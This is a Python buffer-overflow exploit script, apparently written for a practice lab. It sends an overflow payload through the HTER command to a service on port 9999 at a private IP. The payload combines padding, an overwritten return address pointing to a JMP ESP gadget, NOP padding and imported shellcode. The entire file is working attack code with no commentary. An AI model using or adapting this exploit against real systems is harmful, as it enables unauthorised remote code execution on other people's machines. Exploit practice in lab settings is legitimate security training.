import socket

import pwn

from utils import shellcode_hex

A_padding=b"\x41"*2041
eip=b"\x42"*8
C_padding=b"\x43"* (3000-len(A_padding)-len(eip))

# jmpesp=pwn.p32(0x625011af)
jmpesp=b"AF115062"

eip=jmpesp

poc=A_padding+eip+C_padding

NOP_padding=b"90" *10
C_padding=b"\x43"* (3000-len(A_padding)-len(eip)-len(shellcode_hex)-len(NOP_padding)-len(NOP_padding))
poc=A_padding+eip+NOP_padding+shellcode_hex+NOP_padding+C_padding

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.58.135',9999))
s.recv(1024)
s.send(b'HTER ' + poc +b'\r\n')
s.send(b'EXIT' +b'\r\n')